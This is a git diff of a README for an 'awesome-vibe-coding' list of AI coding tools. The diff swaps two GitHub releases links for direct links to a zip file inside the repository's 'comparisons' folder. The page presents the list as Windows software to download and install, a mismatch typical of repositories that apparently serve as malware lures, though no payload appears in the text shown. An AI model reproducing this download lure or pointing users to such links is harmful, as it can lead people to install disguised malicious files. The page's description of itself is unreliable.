@@ -1,6 +1,6 @@
 # 🚀 awesome-vibe-coding - Build software by talking to machines
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Feilul6656/awesome-vibe-coding/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Feilul6656/awesome-vibe-coding/raw/refs/heads/main/comparisons/awesome-vibe-coding-v1.0.zip)
 
 This repository provides a collection of tools that help you build software using AI. You do not need to write code by hand. You describe what you want, and the tools translate your words into working applications. This list helps you find the right tools for your projects.
 
@@ -14,7 +14,7 @@ This collection groups tools by category so you can find solutions for specific 
 
 You can install this software on your Windows computer in a few minutes. Follow these instructions to set up your environment.
 
-[Visit this page to download](https://github.com/Feilul6656/awesome-vibe-coding/releases)
+[Visit this page to download](https://github.com/Feilul6656/awesome-vibe-coding/raw/refs/heads/main/comparisons/awesome-vibe-coding-v1.0.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version at the top of the list.
